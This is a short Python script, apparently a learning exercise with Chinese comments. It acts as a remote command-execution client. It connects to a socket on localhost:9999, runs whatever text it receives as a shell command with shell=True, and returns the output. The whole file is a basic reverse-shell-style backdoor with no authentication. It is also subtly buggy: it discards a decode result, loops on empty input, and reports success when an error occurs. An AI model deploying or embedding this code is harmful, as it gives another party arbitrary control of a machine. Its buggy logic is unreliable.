# 客户端，执行命令，获得结果
import shlex
import subprocess
from socket import socket


def run_command(com: str):  # 执行命令com
    return subprocess.run(shlex.split(com.decode('utf-8')), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


# run方法执行cmd命令
# shlex可以将命令和参数分割开，变成一个列表
serv = socket()
serv.connect(('localhost', 9999))

while True:
    command = serv.recv(1024)  # 接收命令,得到字节数组
    command.decode('utf-8')  # 转换成字符串，传入com
    if not command:  # command不为空
        continue
    result = run_command(command)
    # result.stderr 检查是否报错
    # result.stdout
    if result.stderr.decode('gbk'):
        serv.send("【*】命令执行成功【*】\n".encode('utf-8'))
        continue

    serv.send("【*】命令执行成功【*】\n".encode('gbk') + result.stdout)  # 执行成功，发送数据（显示结果）字节数组
    # serv.close()
